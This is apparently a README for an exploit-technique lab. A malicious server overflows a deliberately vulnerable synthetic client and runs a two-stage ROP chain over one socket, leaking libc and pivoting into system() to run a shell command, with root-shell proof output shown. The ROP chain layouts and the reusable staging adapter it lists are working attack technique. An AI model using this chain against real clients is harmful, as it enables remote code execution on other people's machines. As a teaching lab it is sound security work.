# 01 — Single-Socket Reverse Staging

**Malicious server → client RCE, with the leak and stage-2 carried over one
reused socket, in one ROP chain.**

A client dials out to a server, does a small handshake, and then reads a
length-prefixed response into a fixed stack buffer **without checking the
length**. The server is the attacker (endpoint redirection or a plaintext MITM).
The binary is a legacy build: **No PIE / No canary / NX / Partial RELRO**.

The interesting constraint: the victim is a **one-shot client**. Every run is a
fresh process with fresh ASLR, so the textbook "leak in request A, exploit in
request B" *does not apply* — a leak from one process is meaningless to the next.
Everything therefore happens **inside a single connection, in a single overflow,
in a single ROP chain.**

> All internals here (gadget names, protocol framing, offsets) are **original to
> this demo**. See the top-level README for why the repo ships a synthetic
> target instead of any real one.

---

## The chain

```
overflow body =  [ 'A' * OFFSET ]  +  stage-1 ROP
```

**stage-1** (executes in the victim, entirely over the connected socket `fd 3`):

```
pop rdi ; 3
pop rsi ; send@got
pop rdx ; 8
g_send0            # send(3, send@got, 8, 0)   -> leak libc 'send' back to attacker
pop rdi ; 3
pop rsi ; STAGE2
pop rdx ; 0x100
g_recv0            # recv(3, STAGE2, 0x100, 0)  -> BLOCKS, waiting for stage-2
pop rsp ; STAGE2   # pivot into the received stage-2
```

**attacker (the server)**, after `recv`-ing the 8-byte leak:

```
libc_base = leak - libc.sym.send
stage2    = [ ret ; pop rdi ; &cmd ; system ] + b"id > /tmp/pwned; uname -m >> ...\0"
send(stage2)       # the victim's recv() unblocks; pivot fires; system(cmd) runs
```

The single `ret` before `system` fixes 16-byte stack alignment (the classic
`movaps` foot-gun). `STAGE2` is placed high inside a fixed, mapped global so
`system()` has writable room to grow its frame downward.

### Why two packets, not one

stage-2 embeds the **runtime** `system` address, which is only knowable *after*
the leak round-trips back to the attacker. So it physically cannot be bundled
with stage-1. What keeps this a **single connection** is that the stage-1 chain
contains its own `recv` gadget: the victim leaks, then **blocks in `recv` mid-
chain** on the same socket until the attacker sends stage-2. The round-trip is
self-synchronizing.

```
attacker ──(1) overflow response──▶ victim
victim   ──(2) send(send@got) ─────▶ attacker      # leak
attacker ──(3) stage-2 (real sys) ─▶ victim         # recv unblocks -> pivot -> system()
```

---

## Planted gadgets (and why)

`send`/`recv` are 4-arg; the 4th (flags) is `%rcx`. A pure-ROP caller must zero
it, but a clean `pop rcx ; ret` is often missing, and on glibc ≥ 2.34 the old
`__libc_csu_init` pop-gadgets are gone too. Real targets contain equivalent
`mov ecx,0 ; call send` sequences **incidentally**; here we plant labeled
equivalents (`g_send0`, `g_recv0`, plus `g_pop_*`) so the technique reproduces
against this binary **without shipping anyone's proprietary code**.

Recovering the same primitives from an *unmodified* target is an exercise in
gadget hunting: a `mov ecx,0 ; call recv` tucked inside a socket wrapper for the
flags-zero call site, and `ret2csu` to control `%rdx`. That mapping is what a
real writeup documents; this folder keeps it planted so `run.sh` just works.

---

## Run it

```bash
# Apple Silicon only: colima start --arch x86_64
./run.sh
```

Expected tail:

```
[srv] socket leak: send=0x7f... -> libc base=0x7f...
=== single-socket reverse staging demo (randomize_va_space=2) ===
MARKER: True
PROOF:
uid=0(root) gid=0(root) groups=0(root)
x86_64
2
```

`randomize_va_space=2` in the proof is the victim reporting **its own full-ASLR
state** — the point being that ASLR is not the boundary here; **PIE is**. Rebuild
the target with `-fpie -pie` and the fixed-address gadgets/PLT vanish, the socket
leak loses its fixed anchor, and the same bug degrades to a remote **DoS**.

## Files

| file | role |
|---|---|
| `src/vuln_client.c` | synthetic vulnerable client (the victim) |
| `src/Makefile` | builds it No-PIE / No-canary / Partial-RELRO |
| `exploit/find_offset.py` | measures the saved-RIP offset via a core dump |
| `exploit/evil_server.py` | malicious server + single-socket staged exploit |
| `exploit/staged_rop.py` | reusable leak-resolution and stage-2 delivery adapter |
| `Dockerfile`, `run.sh` | isolated, reproducible x86_64 lab |

## Adjusting the offset

Frame layout varies by compiler, so `run.sh` measures it at runtime with
`find_offset.py` (cyclic pattern → crash → read the return slot from the core)
instead of hard-coding a number. To do it by hand:

```bash
python3 exploit/find_offset.py        # prints the integer offset
```

## Prior art

This is a composition of long-published ideas — see
[`../references.md`](../references.md). In short: staged GOT-leak-then-ret2libc
over a socket is textbook (HackTricks, the `ropasaurusrex` lineage); the
malicious-server-attacks-client direction is the "Reverse RDP" class (Check
Point, 2019); reusing an existing socket instead of opening a new one is the
BorjaMerino *one-way stager* idea, here run in a two-way, single-chain form.
